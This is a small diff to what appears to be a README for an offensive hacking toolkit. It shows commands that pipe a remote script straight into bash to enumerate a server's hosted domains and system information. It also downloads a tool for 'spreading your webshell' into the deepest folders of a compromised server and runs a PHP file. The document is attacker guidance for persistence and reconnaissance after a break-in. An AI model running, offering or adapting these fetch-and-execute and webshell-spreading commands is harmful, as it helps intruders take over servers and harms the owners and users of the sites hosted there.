@@ -6,7 +6,10 @@ Show all domains hosted on a server + system-information :
 ```sh
 curl -fsSL https://raw.githubusercontent.com/haxor-research/tools/master/what_server.sh | bash
 ```
-Spreading your webshell to the destination folder using a random name
+Spreading your webshell to the deepest destination folder 
 ```sh
 wget https://raw.githubusercontent.com/haxor-research/tools/master/dor
+```
+```php
+php ob.php
 ```
